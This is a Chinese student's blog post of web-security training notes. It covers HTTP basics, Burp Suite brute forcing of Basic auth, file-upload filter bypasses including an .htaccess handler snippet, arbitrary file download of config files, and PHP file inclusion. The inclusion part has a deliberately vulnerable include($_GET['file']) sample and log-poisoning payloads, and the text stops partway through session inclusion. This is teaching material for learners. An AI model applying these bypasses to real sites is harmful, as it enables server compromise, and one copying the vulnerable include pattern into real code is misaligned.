<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="前言       实训的笔记，记录一下，防止忘记                     网站URL       统一资源定位器(uniform resource locator)，用来定位服务器的资源 标准格式：protocol:&#x2F;&#x2F;hostname[:port]&#x2F;path&#x2F;[?query] http默认80端口  %[ascii]：此外+也代表空格，常用">
<meta property="og:type" content="article">
<meta property="og:title" content="大三末实训">
<meta property="og:url" content="http://pig-007.github.io/2022/06/19/%E5%AE%9E%E8%AE%AD/index.html">
<meta property="og:site_name" content="PIG-007">
<meta property="og:description" content="前言       实训的笔记，记录一下，防止忘记                     网站URL       统一资源定位器(uniform resource locator)，用来定位服务器的资源 标准格式：protocol:&#x2F;&#x2F;hostname[:port]&#x2F;path&#x2F;[?query] http默认80端口  %[ascii]：此外+也代表空格，常用">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530112713188.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530141434979.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530142815202.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530143957584.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530144221805.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530145435543.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192510353.png">
<meta property="og:image" content="c:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20220530192504191.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192534539.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192702136.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192746452.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192817488.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212508036.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212656016.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530205111015.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530213952989.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530214053524.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601104430476.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105607099.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105623772.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174400213.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174509112.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601203337176.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202513684.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601202712181.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210615644.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210629504.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601210654804.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104504618.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104554318.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609104633495.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609105153708.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140222567.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609140308956.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220609173011737.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610150042385.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220610155923179.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113058963.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612112056049.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612113904560.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120816854.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612120947874.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121049196.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612121321908.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612174542324.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220612175006529.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613112926445.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113027598.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113106132.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613113225371.png">
<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220613114812865.png">
<meta property="article:published_time" content="2022-06-19T02:25:33.000Z">
<meta property="article:modified_time" content="2023-09-11T12:52:52.059Z">
<meta property="article:author" content="PIG-007">
<meta property="article:tag" content="WEB">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530112713188.png"><title>大三末实训 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2022/06/19/%E5%AE%9E%E8%AE%AD/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":true},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">大三末实训</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-06-19</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body">
        <h2 id="前言"   >
          <a href="#前言" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言" class="headerlink" title="前言"></a>前言</h2>
      <p>实训的笔记，记录一下，防止忘记</p>

        <h2 id="网站URL"   >
          <a href="#网站URL" class="heading-link"><i class="fas fa-link"></i></a><a href="#网站URL" class="headerlink" title="网站URL"></a>网站URL</h2>
      <p>统一资源定位器(<code>uniform resource locator</code>)，用来定位服务器的资源</p>
<p>标准格式：<code>protocol://hostname[:port]/path/[?query]</code></p>
<p><code>http</code>默认80端口</p>
<ul>
<li><p><code>%[ascii]</code>：此外<code>+</code>也代表空格，常用来转换<code>&amp;</code>字符或者其他的一些特殊字符</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530112713188.png" alt="image-20220530112713188"></p>
</li>
<li><p><code>base64</code>编码：<code>http</code>环境下传递较长的标识信息</p>
</li>
<li><p><code>Hex</code>编码：</p>
</li>
</ul>

        <h2 id="协议HTTP"   >
          <a href="#协议HTTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#协议HTTP" class="headerlink" title="协议HTTP"></a>协议HTTP</h2>
      <p>无状态的协议，通过<code>cookie</code>和<code>session</code>来进行相关的状态处理</p>

        <h3 id="1-请求报文"   >
          <a href="#1-请求报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-请求报文" class="headerlink" title="(1)请求报文"></a>(1)请求报文</h3>
      
        <h4 id="①结构"   >
          <a href="#①结构" class="heading-link"><i class="fas fa-link"></i></a><a href="#①结构" class="headerlink" title="①结构"></a>①结构</h4>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530141434979.png" alt="image-20220530141434979"></p>
<ul>
<li><code>User-Agent</code>：产生请求的浏览器类型，一般可以随意指定，但是当服务器方面有限制则会受到影响，比如爬虫进行检查</li>
<li><code>Accept</code>：用户声明客户端可以处理的<code>MIME</code>类型，即文件类型</li>
<li><code>Accept-Encoding</code>：用于声明客户端能够理解的内容编码方式</li>
<li><code>Accept-Language</code>：用于声明客户端可以理解的自然语言</li>
<li><code>Cookie</code>：存放用户的身份凭证</li>
<li><code>Content-Length</code>：请求数据的长度，服务器端只会按照该字段进行长度解析，多余的截断。</li>
<li><code>Referer</code>：当前访问URL的上一个URL，用户从什么地方来到该页面的</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530142815202.png" alt="image-20220530142815202"></p>

        <h4 id="②请求方法"   >
          <a href="#②请求方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#②请求方法" class="headerlink" title="②请求方法"></a>②请求方法</h4>
      <p><code>GET/POST/CONNECT</code>等等</p>
<p><code>GET</code>：没有请求数据的部分，在URL中传输数据，由于URL长度限制，所以传输的数据也是有限制的。</p>
<p><code>POST</code>：在请求数据部分进行数据传输，长度基本没有什么限制，注意设置<code>Content-Type</code>和<code>Content-Length</code></p>

        <h3 id="2-响应报文"   >
          <a href="#2-响应报文" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-响应报文" class="headerlink" title="(2)响应报文"></a>(2)响应报文</h3>
      <p>描述服务器端的一些信息</p>

        <h4 id="①结构-1"   >
          <a href="#①结构-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#①结构-1" class="headerlink" title="①结构"></a>①结构</h4>
      <ul>
<li><p><code>Data</code>：请求发送的时间和日期，GMT时间</p>
</li>
<li><p><code>Server</code>：告诉客户端服务器的名称和版本号</p>
</li>
<li><p><code>Content-Type</code>：响应正文的<code>MIME</code>类型</p>
</li>
<li><p><code>Content-Length</code>：响应正文的长度</p>
</li>
<li><p><code>Connection</code>：告诉客户端完成相应后的连接状态</p>
</li>
<li><p><code>Content-Encoding</code>：Web服务器告诉浏览器数据传输使用了那种压缩方法</p>
</li>
<li><p><code>Last-Modified</code>：实体报头域用于指示资源最后的修改日期和时间</p>
</li>
<li><p>状态码：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530143957584.png" alt="image-20220530143957584"></p>
<ul>
<li>200：请求成功</li>
<li>1XX：服务器收到请求，需要请求者继续执行操作</li>
<li>2XX：成功</li>
<li>3XX：重定向，需要进一步的操作用以完成请求。类似需要登录</li>
<li>4XX：客户端错误，请求包含语法错误或者无法完成请求</li>
<li>5XX：服务器端错误，服务器在处理请求的过程中发生了错误</li>
</ul>
</li>
</ul>
<p>等等，还有一些其他的</p>

        <h2 id="协议HTTPS"   >
          <a href="#协议HTTPS" class="heading-link"><i class="fas fa-link"></i></a><a href="#协议HTTPS" class="headerlink" title="协议HTTPS"></a>协议HTTPS</h2>
      <p>在<code>HTTP</code>下加入了<code>SSL/TLS</code>层，通过安全机制进行传输数据。握手过程是明文传输，来建立<code>HTTPS</code>连接</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530144221805.png" alt="image-20220530144221805"></p>

        <h2 id="会话"   >
          <a href="#会话" class="heading-link"><i class="fas fa-link"></i></a><a href="#会话" class="headerlink" title="会话"></a>会话</h2>
      <p>利用<code>cookie</code>(客户端)和<code>session</code>(服务端)来进行保存会话状态，比如记住密码</p>
<p>客户端第一次发送数据给服务端时没有<code>Cookie</code>，服务器收到请求后，创建<code>Session</code>，之后通过<code>Set-Cookie</code>字段把<code>Session ID</code>以<code>Cookie</code>的形式告诉客户端。以后每次请求发送该<code>Cookie</code>到服务器，服务器即可识别。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530145435543.png" alt="image-20220530145435543"></p>

        <h2 id="关于Webshell"   >
          <a href="#关于Webshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#关于Webshell" class="headerlink" title="关于Webshell"></a>关于Webshell</h2>
      <p>一个服务器权限</p>

        <h2 id="身份认证"   >
          <a href="#身份认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2>
      <p>通常爆破</p>

        <h3 id="1-常见认证"   >
          <a href="#1-常见认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-常见认证" class="headerlink" title="(1)常见认证"></a>(1)常见认证</h3>
      <p><code>Burpsuite</code>中的<code>Intruder</code>模块有很多选项</p>
<p>可以设置需要爆破的地方，爆破方式，编码方式，爆破字典，是否跳转(状态码为302)等等</p>

        <h3 id="2-Basic认证"   >
          <a href="#2-Basic认证" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-Basic认证" class="headerlink" title="(2)Basic认证"></a>(2)Basic认证</h3>
      <p>常见<code>admin:passwd</code>等，关键词为：<code>Authorization：Basic [xxxx]</code>，其中<code>xxxx</code>即为<code>admin:passwd</code>的相关编码，这个可以在<code>Intruder-&gt;Payloads-&gt;Payload type</code>选择<code>Custom iterator</code>。之后在<code>Payload Options [Simple list]</code>中设置下不同的字典即可，即自定义一个字段的不同位置数据的迭代爆破。</p>
<ul>
<li>设置方式</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192510353.png" alt="image-20220530192510353"></p>
<ul>
<li><p>设置字典</p>
<ul>
<li><p>用户密码<img src="C:/Users/007/AppData/Roaming/Typora/typora-user-images/image-20220530192504191.png" alt="image-20220530192504191"></p>
</li>
<li><p>中间冒号</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192534539.png" alt="image-20220530192534539"></p>
</li>
<li><p>字典</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192702136.png" alt="image-20220530192702136"></p>
</li>
</ul>
</li>
<li><p>设置编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192746452.png" alt="image-20220530192746452"></p>
</li>
<li><p>取消特殊字符，这里即为<code>=</code>的<code>url</code>编码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530192817488.png" alt="image-20220530192817488"></p>
</li>
</ul>

        <h2 id="文件上传"   >
          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2>
      
        <h3 id="1-验证漏洞"   >
          <a href="#1-验证漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-验证漏洞" class="headerlink" title="(1)验证漏洞"></a>(1)验证漏洞</h3>
      <ul>
<li><p>客户端<code>JavaScript</code>验证</p>
<p>当发现不是从服务器返回的验证不通过信息，就可能是客户端本身的<code>JavaScript</code>进行了验证，那么就可以在<code>Burpsuite</code>发包的过程对文件进行修改，比如改掉文件名称等。</p>
<p>或者直接修改本地网页中的<code>JavaScript</code>代码，或者使用插件禁用掉<code>JavaScript</code>代码脚本</p>
</li>
<li><p>服务端验证</p>
<ul>
<li><p><code>MIME</code>限制：常见的服务器对<code>Content-Type</code>进行解析限制</p>
</li>
<li><p>文件内容验证：通常验证文件头，可以修改其文件头，或者将一句话木马放入到对应的文件内容最后</p>
<p><code>JPG</code>：FF D8 FF E0 00 10 4A 46 49 46</p>
<p><code>GIF</code>：47 49 46 38 39 61<code>(GIF89a)</code></p>
<p><code>PNG</code>：89 50 4E 47</p>
</li>
<li><p>文件扩展名验证：验证文件的后缀，黑名单白名单之类的</p>
<ul>
<li><p>大小写绕过(<code>Windows</code>下大小写不敏感)</p>
</li>
<li><p><code>windows</code>下的文件名后缀不规范（或者某些特殊字符）会被改掉，比如<code>test.php....</code>会被修改为<code>test.php</code>，但是这样就可以绕过验证了，实际还是执行的<code>php</code>文件。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212508036.png" alt="image-20220530212508036"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530212656016.png" alt="image-20220530212656016"></p>
</li>
<li><p>如果只是替换后缀名，那么可以进行拓展后缀名绕过，比如<code>phphpp</code></p>
</li>
<li><p><code>%00</code>截断绕过：保存文件时可能会将文件名和目录进行拼接，那么就可以绕过<code>（PHP&lt;5.3.34）</code></p>
</li>
<li><p>特殊可解析后缀绕过：</p>
<p>在某些环境（比如基于<code>ubuntu</code>的<code>apt-get</code>按照的<code>apache</code>）中，会将某些特殊的文件名后缀当作某一类文件进行解析，比如<code>php3</code>会被当作<code>php</code>解析</p>
<p>可能是开发的时候历史遗留问题把</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530205111015.png" alt="image-20220530205111015"></p>
</li>
</ul>
</li>
<li><p><code>Apache</code>的<code>.htaccess</code>绕过</p>
<p><code>Apache</code>里面有一个配置文件，<code>xx.htacess</code>可以用来写入<code>Apache</code>配置信息，用来改变当前目录以及子目录下的<code>Apache</code>的配置信息。</p>
<p>需要如下条件：</p>
<ul>
<li><p>运行<code>.htaccess</code>生效</p>
</li>
<li><p><code>Apache</code>开启<code>rewrite</code>模块</p>
</li>
<li><p><code>Apache</code>配置文件为<code>AllowOverride All</code>（默认为<code>None</code>）</p>
</li>
</ul>
<p>那么就可以尝试上传该文件</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;sec.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></div></figure>

<p>之后当前配置下生效的地方，<code>sec.jpg</code>即可被解析为<code>php</code></p>
</li>
</ul>
</li>
</ul>

        <h3 id="2-服务器解析漏洞"   >
          <a href="#2-服务器解析漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-服务器解析漏洞" class="headerlink" title="(2)服务器解析漏洞"></a>(2)服务器解析漏洞</h3>
      <ul>
<li><p><code>Apache</code>解析漏洞</p>
<p>从右往左解析，<code>abc.php.ccc.aaa</code>会被当作<code>abc.php</code>来进行解析（某些版本）</p>
</li>
<li><p><code>IIS6.0</code>解析漏洞（<code>windows</code>的中间件）</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530213952989.png" alt="image-20220530213952989"></p>
</li>
<li><p><code>Nginx</code>解析漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220530214053524.png" alt="image-20220530214053524"></p>
</li>
</ul>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs" >c0ny1/upload-labs: 一个想帮你总结所有类型的上传漏洞的靶场 (github.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="文件下载"   >
          <a href="#文件下载" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h2>
      
        <h3 id="1-利用"   >
          <a href="#1-利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-利用" class="headerlink" title="(1)利用"></a>(1)利用</h3>
      <p>过滤规则不好，可以下载任意文件</p>
<ul>
<li>获取站点源码</li>
<li>获取站点与中间件配置文件</li>
<li>获取应用与系统的配置文件</li>
</ul>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601104430476.png" alt="image-20220601104430476"></p>
<p>可利用的相关配置文件</p>
<ul>
<li><p>Windows平台</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105607099.png" alt="image-20220601105607099"></p>
</li>
<li><p>Linux平台</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601105623772.png" alt="image-20220601105623772"></p>
</li>
</ul>

        <h3 id="2-防御"   >
          <a href="#2-防御" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-防御" class="headerlink" title="(2)防御"></a>(2)防御</h3>
      <ul>
<li>文件保存到数据库，依据ID进行下载</li>
<li>参数过滤，不能目录穿越</li>
</ul>

        <h2 id="文件包含"   >
          <a href="#文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2>
      <p>即<code>include</code>和<code>require</code>相关函数，将用户指定的文件包含进来。那么如果该文件中有<code>php</code>代码，则会被执行，其他的字符，则会被输出。不受到相关文件后缀，文件头之类的限制。</p>

        <h3 id="1-函数解析"   >
          <a href="#1-函数解析" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-函数解析" class="headerlink" title="(1)函数解析"></a>(1)函数解析</h3>
      <ul>
<li><code>include</code>：包含过程中如果出现错误，只会生成警告（<code>E_WARNING</code>），在<code>include</code>函数后面的代码还是会正常被执行</li>
<li><code>require</code>：包含过程中如果出现错误，会生成致命错误（<code>E_COMPILE_ERROR</code>）并且停止脚本运行，之后的代码都不包会被运行。</li>
<li><code>include_once</code>和<code>require_once</code>两个函数，如果文件已经包含，则不会再次被包含，防止相关函数重定义或者变量重新赋值。</li>
</ul>

        <h3 id="2-漏洞利用"   >
          <a href="#2-漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-漏洞利用" class="headerlink" title="(2)漏洞利用"></a>(2)漏洞利用</h3>
      <p>通过<code>PHP</code>函数引入文件时，如果对文件名没有限制或者合理的验证，很容易执行到相关的漏洞<code>php</code>代码或者文件信息泄露。</p>
<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>


        <h4 id="①本地文件包含"   >
          <a href="#①本地文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#①本地文件包含" class="headerlink" title="①本地文件包含"></a>①本地文件包含</h4>
      <p>即包含服务器本身的文件。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=test.txt</span><br></pre></td></tr></table></div></figure>


        <h4 id="②远程文件包含"   >
          <a href="#②远程文件包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#②远程文件包含" class="headerlink" title="②远程文件包含"></a>②远程文件包含</h4>
      <p>利用<code>URL</code>，使得网络中的可访问文件被包含，不过需要在<code>php.ini</code>中开启如下配置项</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_fopen = on(默认开启)</span><br><span class="line">allow_url_include = on(php5.2以后默认关闭)</span><br></pre></td></tr></table></div></figure>

<p>如下</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=www.baidu.com</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-其他利用方式"   >
          <a href="#3-其他利用方式" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-其他利用方式" class="headerlink" title="(3)其他利用方式"></a>(3)其他利用方式</h3>
      
        <h4 id="①包含日志文件"   >
          <a href="#①包含日志文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#①包含日志文件" class="headerlink" title="①包含日志文件"></a>①包含日志文件</h4>
      <ul>
<li>利用原理</li>
</ul>
<p>输入<code>URL</code>时，输入相关的<code>php</code>代码使之报错，随即就会将相关的报错信息输入到<code>log</code>中，那么就可以将<code>php</code>的相关代码输入到日志中，那么我们包含该日志就会执行到该代码。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1/index.php?file=&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174400213.png" alt="image-20220601174400213"></p>
<ul>
<li><p>利用条件：</p>
<ul>
<li>日志文件可读</li>
<li>知道日志文件的存储目录</li>
</ul>
</li>
<li><p>常见的日志文件目录：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601174509112.png" alt="image-20220601174509112"></p>
</li>
</ul>
<p>并且一般情况下日志存储目录会被修改，需要读取服务器的相关配置文件（<code>httpd.conf</code>,<code>nginx.conf</code>等），或者依据<code>phpinfo()</code>来获取。</p>
<p>相关的日志信息也可以被调整，限制。</p>

        <h4 id="②包含Session"   >
          <a href="#②包含Session" class="heading-link"><i class="fas fa-link"></i></a><a href="#②包含Session" class="headerlink" title="②包含Session"></a>②包含<code>Session</code></h4>
      <ul>
<li><p>条件：</p>
<ul>
<li><p><code>Session</code>中存在可控变量</p>
</li>
<li><p><code>Session</code>文件可以读写，并且知道存储路径</p>
</li>
</ul>
</li>
<li><p>默认存储路径：</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220601203337176.png" alt="image-20220601203337176"></p>
</li>
</ul>
<p>相关的<code>index.php</code>如下</p>
